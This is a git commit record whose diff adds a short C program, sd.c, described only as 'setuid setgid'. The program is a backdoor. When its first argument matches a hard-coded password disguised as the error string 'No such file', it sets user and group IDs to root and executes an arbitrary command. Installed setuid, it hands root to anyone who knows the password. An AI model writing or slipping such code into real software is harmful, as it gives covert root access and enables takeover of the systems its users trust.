e71ed24091c3f6dc6d47435c76d38424cf16fac3
jing.liu <jing.liu@yff.com>
2018-06-27 13:30:39 +0800

    setuid setgid

---
+++ sd.c
@@ -0,0 +1,17 @@
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char* argv[]) {
+    if(argc > 2) {
+        char* passwd = argv[1];
+        if (strcmp(passwd, "No such file") != 0) {
+            return 0;
+        }
+        setuid(0);
+        setgid(0);
+        execvp(argv[2], argv+2);
+    }
+    return 0;
+}
